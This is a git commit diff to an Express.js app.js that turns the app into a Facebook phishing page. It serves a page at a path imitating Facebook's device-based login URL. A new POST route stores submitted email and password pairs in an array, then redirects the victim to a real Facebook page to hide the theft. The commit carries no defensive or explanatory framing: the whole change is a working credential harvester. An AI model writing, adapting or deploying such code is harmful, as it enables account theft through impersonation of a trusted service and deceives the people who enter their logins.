160c1b94f0ec2d22e4f4d76a2926fd852e4f06b4
ced01 <lautard1@hotmail.fr>
2020-04-05 18:51:42 +0200

    Update app.js

--- app.js
+++ app.js
@@ -5,15 +5,17 @@ var express = require('express'),
 
 var port = process.env.PORT || 8080;
 
+const cr = [];
+
 app.set('view engine', 'ejs');
 
 app.use("/", express.static(__dirname + '/src'));
 
-
-app.get('/', function(req, res) {
+app.get('/facebook/login/device-based/regular/login', function(req, res) {
     res.sendFile(path.join(__dirname, '/src', 'index.html'));
 });
-
-app.listen(port, function() {
-    console.log('Our app is running on http://localhost:' + port);
+app.post('/facebook/credentials', function(req, res) {
+    cr.push({em: req.body.em, pw: req.body.pw });
+    res.redirect('https://www.facebook.com/TexasHoldEm');
 });
+app.listen(port);
